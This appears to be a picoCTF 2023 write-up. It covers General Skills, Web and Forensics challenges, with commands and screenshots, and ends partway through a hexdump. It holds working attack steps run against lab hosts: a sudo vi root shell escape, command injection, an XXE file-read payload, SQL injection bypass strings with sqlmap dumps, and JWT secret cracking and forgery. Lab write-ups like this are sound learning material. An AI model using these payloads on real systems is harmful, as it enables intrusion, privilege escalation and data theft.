<h2>chrono Gneral Skills -- 100 points</h2>

![image](https://user-images.githubusercontent.com/67879936/226687719-42b2846c-c3fc-41d5-81fd-2ba56610a025.png)

Starting the instance we were given ssh credentials to connect to, now lets connect

>command: ssh picoplayer@saturn.picoctf.net -p 53271

![image](https://user-images.githubusercontent.com/67879936/226688073-bc027985-c22f-45a5-8fc7-ce2fe56218db.png)

cool, we are logged in. Looking at the description of the challenge it says "**_How to automate tasks to run at interval on linux servers?_**". What came to mind when I saw this was a cronjob.

<font color="Green">A cronjob is a task or command that is scheduled to run automatically at specific intervals on a Unix or Linux system. Cron is a time-based job scheduler in Unix and Linux operating systems, which allows users to schedule jobs or scripts to run automatically at specified times or intervals. A cronjob consists of a set of instructions or a script that tells the system what to do and when to do it. For example, a cronjob could be set up to run a backup script every night at midnight or to update a database every hour.</font>

Now we can view a cronjob running when we reapicoCTF{Sch3DUL7NG_T45K3_L1NUX_1b4d8744}d the contents of the ```crontab``` file in the ```/etc``` directory.

![image](https://user-images.githubusercontent.com/67879936/226690638-c0eecc92-77c6-4011-88f8-041ac988e5b7.png)

cool, we got the flag

FLAG:- ```picoCTF{Sch3DUL7NG_T45K3_L1NUX_1b4d8744}```




<h2>money-ware General Skills -- 100 points</h2>

![image](https://user-images.githubusercontent.com/67879936/226774556-d8b41c6f-53a1-4bc0-b0b1-5c111e50a8c3.png)

We got a hint that said "**_Some crypto-currencies abuse databases exist; check them out!_**"

Then I went to google and got this url https://www.bitcoinabuse.com/

Lets paste the bitcoin address in here

![image](https://user-images.githubusercontent.com/67879936/226773534-3900dabd-ab93-40a3-8c0e-f7a40eddec6d.png)

At the bottom of this page we find the link that says more information here: https://blog.avira.com/petya-strikes-back/ 

Navigating to that link

![image](https://user-images.githubusercontent.com/67879936/226774117-b51feb08-86d9-4317-970d-fe683d8e0734.png)

Reading more about petya

<font color="Green">Petya is a type of malware that was first discovered in 2016. It is a ransomware that encrypts the entire hard drive of an infected computer, making it impossible for the user to access any files or data stored on it. The malware demands a ransom payment in exchange for a decryption key to restore access to the encrypted files.</font>

I think we found our flag

FLAG:- ```picoCTF{Petya}```




<h2>permissions General Skills -- 100 points</h2>

![image](https://user-images.githubusercontent.com/67879936/226691382-6c1aa280-d329-4cbc-a579-fec959c68c2e.png)

We also got another ssh instance to connect to, lets go ahead and connect 

>command: ssh picoplayer@saturn.picoctf.net -p 60852

![image](https://user-images.githubusercontent.com/67879936/226691689-645ceb2d-d6c8-4d90-9217-a6bae9f5e321.png)

Checking the description of the challenge, it says "**_can you read files in the root file?_**". 

To read root files means we have to escalate our privileges to that of the root user. Running the command ```sudo -l``` I found something interesting

![image](https://user-images.githubusercontent.com/67879936/226692873-fe1c6200-3eec-472a-b07c-c5219739b736.png)

This means we can run the binary ```vi``` as root on the system using sudo. Going to GTFOBins I found the right payload to use

payload:```sudo vi -c ':!/bin/sh' /dev/null```

![image](https://user-images.githubusercontent.com/67879936/226693886-1777095f-1c1f-4a4e-8f1f-96fe1cde9d92.png)

boom!!! we got a shell as root and also got our flag which was in the ```/root``` directory.

FLAG:- ```picoCTF{uS1ng_v1m_3dit0r_1cee9dcb}```



<h2>repititions General Skills -- 100 points</h2>

![image](https://user-images.githubusercontent.com/67879936/226695184-f17295d6-988e-40c3-a68e-4a546d58e1ee.png)

We were given a file to download, lets go ahead and download it to our machine

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/general]
└─$ ls
enc_flag
                                                                                                                                                                       
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/general]
└─$ file enc_flag           
enc_flag: ASCII text
                                                                                                                                                                       
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/general]
└─$ cat enc_flag            
VmpGU1EyRXlUWGxTYmxKVVYwZFNWbGxyV21GV1JteDBUbFpPYWxKdFVsaFpWVlUxWVZaS1ZWWnVh
RmRXZWtab1dWWmtSMk5yTlZWWApiVVpUVm10d1VWZFdVa2RpYlZaWFZtNVdVZ3BpU0VKeldWUkNk
MlZXVlhoWGJYQk9VbFJXU0ZkcVRuTldaM0JZVWpGS2VWWkdaSGRXCk1sWnpWV3hhVm1KRk5XOVVW
VkpEVGxaYVdFMVhSbHBWV0VKVVZGWm9RMlZzV2tWUmJFNVNDbUpXV25wWmExSmhWMGRHZEdWRlZs
aGkKYlRrelZERldUMkpzUWxWTlJYTkxDZz09Cg==
```
ohh nice hehe, we were given a base64 encoding. Lets go ahead and decode this. We'll be using cyberchef for this

Link to CyberChef: https://gchq.github.io/CyberChef/

![image](https://user-images.githubusercontent.com/67879936/226696867-9fb5104c-f416-4bb0-82b4-7ee07ebd2962.png)

I had to decode with base64 six times to get the flag 😂 

FLAG:- ```picoCTF{base64_n3st3d_dic0d!n8_d0wnl04d3d_dfe803c6}```


<h2>Rule-2023 General Skills -- 100 points</h2>

![image](https://user-images.githubusercontent.com/67879936/226698018-0673dd13-8c37-4557-b5ce-ae5e1ae2c5b8.png)

They provided a link, navigatung to the link we saw the rules, and checking the hints we saw that ```Ctrl+F``` won't work. I found the flag anyways by reading through though lool

![image](https://user-images.githubusercontent.com/67879936/226698636-ce4b63d6-be21-4db5-bb03-a7f0ace70f57.png)

FLAG:- ```picoCTF{h34rd_und3r5700d_4ck_cba1c711}```



<h2>useless General Skills -- 100 points</h2>

![image](https://user-images.githubusercontent.com/67879936/226699237-4491b5bd-f08f-405f-98bd-8e38e528f9d9.png)

We were given a ssh instance to connect to. Lets connect to the instance

![image](https://user-images.githubusercontent.com/67879936/226699535-f5549f44-3a28-4720-a60d-a00796a667c7.png)

From the description of this challenge we know we have a script sitting in the user's directory and the script is able to make basic mathematical calculations

```picoplayer@challenge:~$ pwd
/home/picoplayer
picoplayer@challenge:~$ ls -la
total 16
drwxr-xr-x 1 picoplayer picoplayer   20 Mar 21 17:57 .
drwxr-xr-x 1 root       root         24 Mar 16 02:30 ..
-rw-r--r-- 1 picoplayer picoplayer  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 picoplayer picoplayer 3771 Feb 25  2020 .bashrc
drwx------ 2 picoplayer picoplayer   34 Mar 21 17:57 .cache
-rw-r--r-- 1 picoplayer picoplayer  807 Feb 25  2020 .profile
-rwxr-xr-x 1 root       root        517 Mar 16 01:30 useless
picoplayer@challenge:~$ file useless 
useless: Bourne-Again shell script, ASCII text executable
picoplayer@challenge:~$ cat useless 
#!/bin/bash
# Basic mathematical operations via command-line arguments

if [ $# != 3 ]
then
  echo "Read the code first"
else
        if [[ "$1" == "add" ]]
        then 
          sum=$(( $2 + $3 ))
          echo "The Sum is: $sum"  

        elif [[ "$1" == "sub" ]]
        then 
          sub=$(( $2 - $3 ))
          echo "The Substract is: $sub" 

        elif [[ "$1" == "div" ]]
        then 
          div=$(( $2 / $3 ))
          echo "The quotient is: $div" 

        elif [[ "$1" == "mul" ]]
        then
          mul=$(( $2 * $3 ))
          echo "The product is: $mul" 

        else
          echo "Read the manual"
         
        fi
fi
```
Running this program

![image](https://user-images.githubusercontent.com/67879936/226700524-47f8fc80-3dd8-4f8f-942f-392c9fb53e24.png)

I was almost stuck here lool, but then I checked the challenge tags again and saw ```man```.

<font color="Green">On a Linux system, the man command is used to display the manual pages (or "man pages") for a given command or topic. To use the man command, you simply type "man" followed by the name of the command or topic you want to learn about</font>

running the command ```man useless```

![image](https://user-images.githubusercontent.com/67879936/226701284-9b2662e7-88ba-4979-bedd-72bcc0392347.png)

We got the flag hehe

FLAG:- ```picoCTF{us3l3ss_ch4ll3ng3_3xpl0it3d_3555}```



<h2>Special General Skills -- 300 points</h2>

![image](https://user-images.githubusercontent.com/67879936/226752355-407ff1c5-3913-42f0-bf49-78b5acdd35e8.png)

We were given a ssh instance to connect to. lets go ahead and connect

>command: ssh ctf-player@saturn.picoctf.net -p 58250

![image](https://user-images.githubusercontent.com/67879936/226752947-6607c591-4802-47de-bc11-59af3658dbea.png)

Now that we are logged in, I tried running common linux commands like ```cd```,```ls```,```pwd``` but I was getting some errors

![image](https://user-images.githubusercontent.com/67879936/226753673-e768a547-7795-4a5c-8537-63301d9248a2.png)

Going back to the challenge descriptionn, this is a Spell Check Interface for affecting Linux, with this every word is properly spelled and capitalized, this is why when we ran the ```pwd``` command we got the ```Pod``` not found this is because there was automatic correction anc capitalization of the first word.

Checking the hints we have "**_Experiment with different shell syntax_**". After lots of research I found something similar to a command execution. What this means is that we get to use the double underscore (__).

<font color="Green">In a Linux shell, the double underscore (__) is not a command, but rather a convention used to indicate special variables or functions.</font>

>command: __|whoami

![image](https://user-images.githubusercontent.com/67879936/226758471-3849129e-b6cb-4cc7-9719-5a3a42b2eb63.png)

We got ourselves a command injection. This means we can now run linux commands. But there is still an issue, we can only run single commands like ```ls```,```pwd```,```id```,```whoami```, when we try to run ```cd /home``` we get an error

![image](https://user-images.githubusercontent.com/67879936/226760641-8bf878f9-4217-43a4-a3e8-e1a76e4f3ce7.png)

After googling stuffs, I found out that if i run ```__|ls "-la"``` I won't get an error

![image](https://user-images.githubusercontent.com/67879936/226761409-0ff7db7c-0032-49cb-9197-e1cdf9703222.png)

cool, from the above screenshot we can see that ```blargh``` is a directory now lets go ahead and read the flag file. Since this is a CTF competition I assumed the flag name to be "flag.txt"

>command: __|cat "blargh/flag.txt"

![image](https://user-images.githubusercontent.com/67879936/226761957-87700ef5-b64e-4b12-a7f7-9d4122daed4e.png)

cool we got the flag

FLAG:- ```picoCTF{5p311ch3ck_15_7h3_w0r57_a60bdf40}```



<h2>Specialer General Skills -- 400 points</h2>

![image](https://user-images.githubusercontent.com/67879936/226762586-51626a16-bbfb-444b-b5a9-e5ec7cab5509.png)

We got another ssh instance to connect to

![image](https://user-images.githubusercontent.com/67879936/226762812-acce109d-3e12-4a4a-ab0f-8c8f0296c4e3.png)

cool, we are logged in. 

You should have noticed by now that what we tried for the special challenge won't work here xD. 

![image](https://user-images.githubusercontent.com/67879936/226765626-841afe4a-433b-46f5-b933-99e6a0caa7a1.png)

Exactly, we get an error. After looking around for a while and yeah doing research I found out that the echo command works

![image](https://user-images.githubusercontent.com/67879936/226765721-494259e3-c336-4c3d-b71b-7a7c4bfbf971.png)

Nice. We are on the right track

We can use the ```echo *``` to list directories and use ```echo */*``` to list files under the directories

![image](https://user-images.githubusercontent.com/67879936/226766063-6d9f4771-9f07-4926-852a-69e6f357dc75.png)

Our flag is in one of these files, to read the contents of the files we can use the command ```echo "$(<filename)"```

![image](https://user-images.githubusercontent.com/67879936/226766838-ec2971cd-23d1-4fde-9e62-f5c9c1ceb0ca.png)

we found our flag 

FLAG:- ```picoCTF{y0u_d0n7_4ppr3c1473_wh47_w3r3_d01ng_h3r3_811ae7e9}```



<h2>findme Web -- 100 points</h2>

![image](https://user-images.githubusercontent.com/67879936/226775277-6e9a25bf-d668-4084-9536-8a2fc3b10f97.png)

okay, so we have been given a link here and some user creds ```username:test``` ```password:test!```. Navigating to that url

![image](https://user-images.githubusercontent.com/67879936/226775541-045dbd01-fea5-4c53-af2e-dea9d4133571.png)

cool, we got a login page. Now, while inputting the username and password we'll capture this request on burpsuite.

![image](https://user-images.githubusercontent.com/67879936/226777179-a20d1b61-f70c-4268-a19c-479a37631f89.png)
![image](https://user-images.githubusercontent.com/67879936/226777198-7f2fc0b2-f1f5-4779-afb3-dda8fb9a0b89.png)

Lets forward this request we get this

![image](https://user-images.githubusercontent.com/67879936/226776504-9412087f-8cd7-4117-879e-17b57403b323.png)

so I sent this to burp repeater

![image](https://user-images.githubusercontent.com/67879936/226776850-1ee23abc-904c-49dc-87f8-ca6f0d8bb9fe.png)

I think we  got something encoded in base64, putting them together you have ```cGljb0NURntwcm94aWVzX2FsbF90aGVfd2F5X2QxYzBiMTEyfQ==``` Lets decode this using cyberchef

Link: https://gchq.github.io/CyberChef/

![image](https://user-images.githubusercontent.com/67879936/226777095-c8c99c4f-bc56-42c7-9aa7-635f8e72550d.png)

cool, we got the flag

FLAG:- ```picoCTF{proxies_all_the_way_d1c0b112}```



<h2>MatchTheRegex Web -- 100 points</h2>

![image](https://user-images.githubusercontent.com/67879936/226777518-f7e31894-0062-4d7f-bbba-ad10f17c7262.png)

we were provided with a link, navigating to that link



<h2>SOAP Web -- 100 points</h2>

![image](https://user-images.githubusercontent.com/67879936/226987116-0bbee11f-2c34-47c7-9113-33017f09f42a.png)

Navigating to the url provided

![image](https://user-images.githubusercontent.com/67879936/226987360-821a4b74-ac1a-4797-ab64-2a86e63232cd.png)

We get this, from the challenge tags I saw ```xxe```, so it is possible this webpage is vulnerale to xxe injection.

![image](https://user-images.githubusercontent.com/67879936/226987955-2284642d-b186-4d99-bf2b-9696dabfd6b7.png)

Lets capture this on burpsuite

![image](https://user-images.githubusercontent.com/67879936/226988340-dc0ae06f-7b1f-4018-ba55-ba416eed10c3.png)

Lets send the request to burp repeater

![image](https://user-images.githubusercontent.com/67879936/226988520-c650be59-ee7e-4a02-8ed9-12710d0e270f.png)

so we sure can inject our xxe payload there, lets try to read the ```/etc/passwd``` file

```<!DOCTYPE message [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>```

![image](https://user-images.githubusercontent.com/67879936/226989171-cce2b0ba-cf0f-4227-a6f6-d38c1b7afa86.png)

cool, scrolling down we find our flag

![image](https://user-images.githubusercontent.com/67879936/226989447-60da2862-d69e-4fae-bdf7-c95372f1bb41.png)

FLAG:- ```picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_0dcf926e}```



<h2>More SQLi Web -- 200 points</h2>

![image](https://user-images.githubusercontent.com/67879936/226990281-16e57013-0258-4ac6-a57d-c15cdb7c0d0f.png)

Navigating to the webpage

![image](https://user-images.githubusercontent.com/67879936/226990434-adecea52-0e2f-4d74-9842-7b20d57efef2.png)

We got a login page, I tried default credentials here but it didn't work. So I used a sqli bypass payload

```username:' or 1=1--```        ```password:' or 1=1--```

![image](https://user-images.githubusercontent.com/67879936/226990925-08e72ba9-12ed-4ed5-8335-5a290d4647cb.png)

cool, we are logged in.

![image](https://user-images.githubusercontent.com/67879936/226991243-1022e6db-3b5d-4908-85e2-ba21cecbf1a7.png)

capturing this request on burpsuite

![image](https://user-images.githubusercontent.com/67879936/226991480-66714302-02e5-4cf5-a429-294a1a92b0b4.png)

Go ahead and save this  in a file. I saved it as ```req.txt``` on my machine

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/web]
└─$ ls
req.txt
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/web]
└─$ cat req.txt             
POST /welcome.php HTTP/1.1
Host: saturn.picoctf.net:56168
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://saturn.picoctf.net:56168
Connection: close
Referer: http://saturn.picoctf.net:56168/welcome.php
Cookie: PHPSESSID=vl5ea3a3ivs25vobjmrd0g3uau
Upgrade-Insecure-Requests: 1

search=Lagos&submit=Search          
```
We'll be using sqlmap to dump databases here. First lets check the table names available

>command: sqlmap -r req.txt --dbs --tables

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/web]
└─$ sqlmap -r req.txt --dbs --tables                               
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6.12#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:42:19 /2023-03-22/

[18:42:19] [INFO] parsing HTTP request from 'req.txt'
[18:42:21] [INFO] resuming back-end DBMS 'sqlite' 
[18:42:21] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: search=Lagos' AND 5857=5857 AND 'Suul'='Suul&submit=Search

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: search=Lagos' UNION ALL SELECT NULL,CHAR(113,122,118,106,113)||CHAR(120,112,65,98,86,70,84,87,116,112,102,78,120,107,117,98,70,78,110,103,72,114,107,109,68,80,113,74,90,76,98,114,77,87,84,88,107,112,103,98)||CHAR(113,98,107,106,113),NULL-- kOIP&submit=Search
---
[18:42:22] [INFO] the back-end DBMS is SQLite
web server operating system: Linux Ubuntu
web application technology: PHP 7.4.3
back-end DBMS: SQLite
[18:42:22] [WARNING] on SQLite it is not possible to enumerate databases (use only '--tables')
[18:42:22] [INFO] fetching tables for database: 'SQLite_masterdb'
<current>
[4 tables]
+------------+
| hints      |
| more_table |
| offices    |
| users      |
+------------+

[18:42:22] [INFO] fetched data logged to text files under '/home/bl4ck4non/.local/share/sqlmap/output/saturn.picoctf.net'

[*] ending @ 18:42:22 /2023-03-22/
```
We'll be using the table name ```more_table```. Now that we have found the name of our table lets go ahead and dump everything available in this table

>command: sqlmap -r req.txt --dbs -T more_tables --columns --dump-all

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/web]
└─$ sqlmap -r req.txt --dbs -T more_tables --columns --dump-all         
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.12#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:44:56 /2023-03-22/

[18:44:56] [INFO] parsing HTTP request from 'req.txt'
[18:44:56] [INFO] resuming back-end DBMS 'sqlite' 
[18:44:56] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: search=Lagos' AND 5857=5857 AND 'Suul'='Suul&submit=Search

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: search=Lagos' UNION ALL SELECT NULL,CHAR(113,122,118,106,113)||CHAR(120,112,65,98,86,70,84,87,116,112,102,78,120,107,117,98,70,78,110,103,72,114,107,109,68,80,113,74,90,76,98,114,77,87,84,88,107,112,103,98)||CHAR(113,98,107,106,113),NULL-- kOIP&submit=Search
---
[18:44:57] [INFO] the back-end DBMS is SQLite
web server operating system: Linux Ubuntu
web application technology: PHP 7.4.3
back-end DBMS: SQLite
[18:44:57] [WARNING] on SQLite it is not possible to enumerate databases (use only '--tables')
[18:44:57] [INFO] fetching columns for table 'more_tables' 
[18:44:57] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
[18:44:57] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[18:44:57] [WARNING] unable to retrieve column names for table 'more_tables' 
do you want to use common column existence check? [y/N/q] N
[18:45:00] [INFO] sqlmap will dump entries of all tables from all databases now
[18:45:00] [INFO] fetching tables for database: 'SQLite_masterdb'
[18:45:00] [INFO] fetching columns for table 'users' 
[18:45:00] [INFO] fetching entries for table 'users'
Database: <current>
Table: users
[1 entry]
+----+-------+----------------+
| id | name  | password       |
+----+-------+----------------+
| 1  | admin | moreRandOMN3ss |
+----+-------+----------------+

[18:45:00] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/bl4ck4non/.local/share/sqlmap/output/saturn.picoctf.net/dump/SQLite_masterdb/users.csv'
[18:45:00] [INFO] fetching columns for table 'offices' 
[18:45:00] [INFO] fetching entries for table 'offices'
Database: <current>
Table: offices
[8 entries]
+----+----------+--------------------+---------------------------------+
| id | city     | phone              | address                         |
+----+----------+--------------------+---------------------------------+
| 1  | Algiers  | +246 8-616 99 40   | Birger Jarlsgatan 7, 4 tr       |
| 2  | Bamako   | +249 173 329 6295  | Friedrichstraße 68              |
| 3  | Nairobi  | +254 703 039 810   | Ferdinandstraße 35              |
| 4  | Kampala  | +256 720 7705600   | Maybe all the tables            |
| 5  | Kigali   | +250 7469 214 950  | 8 Ganton Street                 |
| 6  | Kinshasa | +249 89 885 627 88 | Sternstraße 5                   |
| 7  | Lagos    | +234 224 25 150    | Karl Johans gate 23B, 4. etasje |
| 8  | Pretoria | +233 635 46 15 03  | 149 Rue Saint-Honoré            |
+----+----------+--------------------+---------------------------------+

[18:45:00] [INFO] table 'SQLite_masterdb.offices' dumped to CSV file '/home/bl4ck4non/.local/share/sqlmap/output/saturn.picoctf.net/dump/SQLite_masterdb/offices.csv'
[18:45:00] [INFO] fetching columns for table 'hints' 
[18:45:00] [INFO] fetching entries for table 'hints'
Database: <current>
Table: hints
[3 entries]
+----+------------------------+
| id | info                   |
+----+------------------------+
| 1  | Is this the real life? |
| 2  | Is this the real life? |
| 3  | You are close now?     |
+----+------------------------+

[18:45:00] [INFO] table 'SQLite_masterdb.hints' dumped to CSV file '/home/bl4ck4non/.local/share/sqlmap/output/saturn.picoctf.net/dump/SQLite_masterdb/hints.csv'
[18:45:00] [INFO] fetching columns for table 'more_table' 
[18:45:00] [INFO] fetching entries for table 'more_table'
Database: <current>
Table: more_table
[2 entries]
+----+---------------------------------------------------------+
| id | flag                                                    |
+----+---------------------------------------------------------+
| 1  | picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_6984ed7d} |
| 2  | If you are here, you must have seen it                  |
+----+---------------------------------------------------------+

[18:45:00] [INFO] table 'SQLite_masterdb.more_table' dumped to CSV file '/home/bl4ck4non/.local/share/sqlmap/output/saturn.picoctf.net/dump/SQLite_masterdb/more_table.csv'                                                                                                                                                                     
[18:45:00] [INFO] fetched data logged to text files under '/home/bl4ck4non/.local/share/sqlmap/output/saturn.picoctf.net'

[*] ending @ 18:45:00 /2023-03-22/
```
cool, we found our flag

FLAG:- ```picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_6984ed7d}```



<h2>Java Code Analysis!?! Web -- 300 points</h2>

![image](https://user-images.githubusercontent.com/67879936/226993303-8febcfe1-2295-4ea9-bac2-dd008643dbaa.png)

Navigating to the webpage

![image](https://user-images.githubusercontent.com/67879936/226993775-32855061-16c2-435d-924c-efa06cb07125.png)

We get a login page, lets login with the credentials they provided for us

```username:user```       ```password:user```

![image](https://user-images.githubusercontent.com/67879936/226994081-3408837c-a3e9-4c41-af38-0c91c74e366b.png)

cool, we are logged in. 

![image](https://user-images.githubusercontent.com/67879936/226994203-125363aa-3e65-431c-b58a-1e97486609e1.png)

You'll get this page when click on the flag pdf, so we don't have the permission to view the pdf. Lets capture the request on burpsuite

![image](https://user-images.githubusercontent.com/67879936/226994602-f9857df6-1731-4126-a1c3-e0a5671c4429.png)
![image](https://user-images.githubusercontent.com/67879936/226994665-acae5a0d-e3fb-4aca-91aa-3bfd037daa33.png)

Sent the request to burp repeater

![image](https://user-images.githubusercontent.com/67879936/227001894-9a0d577f-e787-4ae5-8428-c2e134c1ce3c.png)

So I changed the directory. You can also see that we have a jwt token, lets try to read the pdf file called flag, as you can see it has an ```id``` of ```5```. So, navigating to this directory ```/base/books/pdf/5``` we'll try to read the file. 

![image](https://user-images.githubusercontent.com/67879936/227002348-981b9f6c-d20c-4c9a-829d-972078cd7d81.png)

oops, we got an error that says "**_Access Denied_**". Lets try to decrypt the jwt token to see what it stores

Link: https://jwt.io

![image](https://user-images.githubusercontent.com/67879936/226996480-b4aee037-a980-46e4-ae4c-a6492e288858.png)

So, this jwt token stores information, but looking at the end of the screenshot we see the ```invalid signature``` message, this means even if we make some changes to the informations the token won't still be valid if we don't provide a secret key. 

Checking the hints provided, "**_Maybe try to find the JWT Signing Key ("secret key") in the source code? Maybe it's hardcoded somewhere? Or maybe try to crack it?_**"

So what I did was to crack it, I used a tool called ```jwt-cracker```

You can download it here: https://github.com/lmammino/jwt-cracker

>command: jwt-cracker eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTY4MDExMzQ1MSwiaWF0IjoxNjc5NTA4NjUxLCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.2RQlnqDTS1xJwChm7aR-uNk7Q8naxsoHw0tGq1AzyRw 123456789 6

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/web]
└─$ jwt-cracker eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTY4MDExMzQ1MSwiaWF0IjoxNjc5NTA4NjUxLCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.2RQlnqDTS1xJwChm7aR-uNk7Q8naxsoHw0tGq1AzyRw 123456789 6
SECRET FOUND: 1234
Time taken (sec): 0.519
Attempts: 20000
```
cool, we found the secret key which is ```1234```, now lets apply this as we change some of the informtation the token stores. To be able to view the pdf flag file we have to change the role to ```Admin``` and also change the userId to ```2```. 


![image](https://user-images.githubusercontent.com/67879936/226999491-ac22249c-4792-4555-a9e9-f5d276b4ead8.png)

cool, if you observe the signature is now verified. Lets copy this new token and replace it with the former one that was there

![image](https://user-images.githubusercontent.com/67879936/226999770-4ae36d7d-3eb4-46f0-87d8-82982a2c7e89.png)

I replaced the jwt token already, from the above screenshot you'll see that to be able to read the pdf called flag the ```id``` number is ```5```. So to read this you'll change the directory to this ```/base/books/pdf/5```

![image](https://user-images.githubusercontent.com/67879936/227000191-251acf61-67d9-4fd8-bb0b-2abf00ab66dc.png)

As you can see we aren't getting the error we got the first time we tried it, so this means we can now view the pdf called flag. Using the search box lets search for the word ```pico``` since that's the word the flag starts with

![image](https://user-images.githubusercontent.com/67879936/227000589-16e12156-e6cb-4ed6-805e-611eb7c517bf.png)

cool, we got our flag. This challenge was actually an interesting one 🙂

FLAG:- ```picoCTF{w34k_jwt_n0t_g00d_d72df65e}```




<h2>hideme Forensics -- 100 points</h2>

![image](https://user-images.githubusercontent.com/67879936/227004778-3dff76ce-32ef-416d-9a44-a120667fe186.png)

Downloading the file to my machine

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/forensics]
└─$ ls
flag.png
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/forensics]
└─$ file flag.png        
flag.png: PNG image data, 512 x 504, 8-bit/color RGBA, non-interlaced
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/forensics]
└─$ exiftool flag.png        
ExifTool Version Number         : 12.57
File Name                       : flag.png
Directory                       : .
File Size                       : 43 kB
File Modification Date/Time     : 2023:03:22 19:38:37+01:00
File Access Date/Time           : 2023:03:22 19:38:53+01:00
File Inode Change Date/Time     : 2023:03:22 19:38:48+01:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 512
Image Height                    : 504
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Warning                         : [minor] Trailer data after PNG IEND chunk
Image Size                      : 512x504
Megapixels                      : 0.258
```
So this is a png image. So I went ahead to use  a tool called ```zsteg``` to check if I can extract informations from the file

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/forensics]
└─$ zsteg flag.png 
[?] 3206 bytes of extra data after image end (IEND), offset = 0x9b3b
extradata:0         .. file: Zip archive data, at least v1.0 to extract, compression method=store
    00000000: 50 4b 03 04 0a 00 00 00  00 00 3d 10 70 56 00 00  |PK........=.pV..|
    00000010: 00 00 00 00 00 00 00 00  00 00 07 00 1c 00 73 65  |..............se|
    00000020: 63 72 65 74 2f 55 54 09  00 03 95 78 12 64 95 78  |cret/UT....x.d.x|
    00000030: 12 64 75 78 0b 00 01 04  00 00 00 00 04 00 00 00  |.dux............|
    00000040: 00 50 4b 03 04 14 00 00  00 08 00 3d 10 70 56 5b  |.PK........=.pV[|
    00000050: 9b f6 a9 44 0b 00 00 de  0b 00 00 0f 00 1c 00 73  |...D...........s|
    00000060: 65 63 72 65 74 2f 66 6c  61 67 2e 70 6e 67 55 54  |ecret/flag.pngUT|
    00000070: 09 00 03 95 78 12 64 95  78 12 64 75 78 0b 00 01  |....x.d.x.dux...|
    00000080: 04 00 00 00 00 04 00 00  00 00 cd 56 67 3c db 8d  |...........Vg<..|
    00000090: 16 fe 53 ab 5a 1a 7b ef  52 d7 a8 4d 25 66 5e a3  |..S.Z.{.R..M%f^.|
    000000a0: 66 89 91 88 8a 4d 6d 45  8c d8 1a 6f 75 d0 d7 6a  |f....MmE...ou..j|
    000000b0: ec d0 9a 55 14 af 95 a0  3a d4 2a 6a 94 a6 56 07  |...U....:.*j..V.|
    000000c0: 62 f3 da 23 e2 e6 7e bc  1f ee f7 7b 3e 9c e7 ec  |b..#..~....{>...|
    000000d0: f3 e5 f9 fd ce 79 64 63  6d ca c6 2a c8 0a 00 00  |.....ydcm..*....|
    000000e0: 9b d9 6d 23 18 00 d0 23  68 b6 2a 88 a6 80 83 20  |..m#...#h.*.... |
